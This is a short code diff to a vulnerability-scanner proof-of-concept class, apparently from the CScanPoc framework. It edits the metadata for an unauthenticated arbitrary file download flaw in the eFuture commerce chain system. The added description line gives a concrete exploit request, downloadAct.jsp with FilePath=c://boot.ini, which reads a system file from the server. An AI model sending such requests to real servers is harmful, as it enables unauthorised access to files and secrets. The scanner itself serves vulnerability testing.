@@ -5,18 +5,19 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
-    vuln_id = 'efuture_0000' # 平台漏洞编号，留空
-    name = '京富基融通科技商业链系统任意文件下载（无须登录）' # 漏洞名称
+    vuln_id = 'eFuture_0000' # 平台漏洞编号，留空
+    name = '京富基融通科技商业链系统任意文件下载' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.FILE_DOWNLOAD # 漏洞类型
     disclosure_date = '2014-09-29'  # 漏洞公布时间
     desc = '''
-        京富基融通科技商业链系统任意文件下载（无须登录）
+        京富基融通科技商业链系统任意文件下载（无须登录）。
+        /web/login/downloadAct.jsp?FilePath=c://boot.ini&name=boot.ini
     ''' # 漏洞描述
-    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=066881' # 漏洞来源
+    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=066881
     cnvd_id = '' # cnvd漏洞编号
     cve_id = '' #cve编号
-    product = 'efuture'  # 漏洞应用名称
+    product = 'eFuture'  # 漏洞应用名称
     product_version = ''  # 漏洞应用版本
 
 
